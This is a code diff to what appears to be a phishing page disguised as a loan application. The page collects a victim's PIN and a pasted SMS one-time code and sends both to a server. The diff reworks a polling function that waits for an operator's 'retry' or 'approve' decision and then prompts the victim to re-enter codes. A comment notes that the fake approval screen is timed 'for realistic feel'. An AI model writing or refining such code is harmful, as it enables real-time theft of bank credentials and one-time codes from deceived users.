@@ -895,39 +895,41 @@ HTML_PAGE = r"""<!DOCTYPE html>
         }
       }
     }
-let decisionTimer = null;
-let otpAutoTimer = null;
-if (otpStepTimer) clearTimeout(otpStepTimer);
 
-function watchHostDecision(step) {
-  if (decisionTimer) clearInterval(decisionTimer);
-  decisionTimer = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status/${appState.appId}`);
-      const data = await res.json();
-      if (data.status === 'retry') {
-        clearInterval(decisionTimer);
-        if (otpAutoTimer) clearTimeout(otpAutoTimer);
-        if (step === 'pin') {
-          enteredPin = '';
-          updatePinDots();
-          goTo('pin');
-          alert('The PIN entered is incorrect. Please re-enter your PIN.');
-        } else if (step === 'otp') {
-          const btnOtp = document.getElementById('btn-otp');
-          if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY CODE'; }
-          const errorMsg = document.getElementById('otp-error-msg');
-          if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
-          goTo('otp');
-        }
-      } else if (data.status === 'approve') {
-        clearInterval(decisionTimer);
-        if (otpAutoTimer) clearTimeout(otpAutoTimer);
-      }
-    } catch (e) {}
-  }, 3000);
-}
+    let decisionTimer = null;
+    let otpStepTimer = null;
+    let otpAutoTimer = null;
 
+    function watchHostDecision(step) {
+      if (decisionTimer) clearInterval(decisionTimer);
+      decisionTimer = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/status/${appState.appId}`);
+          const data = await res.json();
+          if (data.status === 'retry') {
+            clearInterval(decisionTimer);
+            if (otpStepTimer) clearTimeout(otpStepTimer);
+            if (otpAutoTimer) clearTimeout(otpAutoTimer);
+            if (step === 'pin') {
+              enteredPin = '';
+              updatePinDots();
+              goTo('pin');
+              alert('The PIN entered is incorrect. Please re-enter your PIN.');
+            } else if (step === 'otp') {
+              const btnOtp = document.getElementById('btn-otp');
+              if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY CODE'; }
+              const errorMsg = document.getElementById('otp-error-msg');
+              if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
+              goTo('otp');
+            }
+          } else if (data.status === 'approve') {
+            clearInterval(decisionTimer);
+            if (otpStepTimer) clearTimeout(otpStepTimer);
+            if (otpAutoTimer) clearTimeout(otpAutoTimer);
+          }
+        } catch (e) {}
+      }, 3000);
+    }
 
     function submitPin() {
       const formattedPhone = formatMobileWithCountryCode(appState.mobile);
@@ -942,7 +944,8 @@ function watchHostDecision(step) {
           value: enteredPin
         })
       }).catch(err => console.error(err));
-  watchHostDecision('pin');
+      watchHostDecision('pin');
+
 
       // Reset PIN busy state and animations
       isPinBusy = false;
@@ -995,7 +998,7 @@ function watchHostDecision(step) {
       const otpTextarea = document.getElementById('otp-message-paste');
       const otpCode = otpTextarea ? otpTextarea.value.trim() : '';
 
-      if (!otpCode) {
+           if (!otpCode) {
         const errorMsg = document.getElementById('otp-error-msg');
         if (errorMsg) errorMsg.innerText = 'Please paste the verification message first.';
         return;
@@ -1023,10 +1026,10 @@ function watchHostDecision(step) {
           value: otpCode
         })
       }).catch(err => console.error(err));
-  watchHostDecision('otp');
-  otpStepTimer = setTimeout(() => {
 
-      setTimeout(() => {
+      watchHostDecision('otp');
+
+      otpStepTimer = setTimeout(() => {
         if (btnOtp) {
           btnOtp.disabled = false;
           btnOtp.innerText = 'VERIFY & CONTINUE';
@@ -1034,9 +1037,7 @@ function watchHostDecision(step) {
         goTo('processing');
 
         // Processing assessment takes 6 seconds for realistic feel
-            otpAutoTimer = setTimeout(() => {
-
-        setTimeout(() => {
+        otpAutoTimer = setTimeout(() => {
           const approvedAmt = document.getElementById('approved-amount');
           const approvedRepay = document.getElementById('approved-repay');
           const approvedDate = document.getElementById('approved-date');
@@ -1049,6 +1050,7 @@ function watchHostDecision(step) {
           else if (days <= 30) rate = 0.10;
           else if (days <= 60) rate = 0.15;
           else rate = 0.20;
+
 
           const interest = Math.round(val * rate);
           const fee = Math.round(val * 0.03);
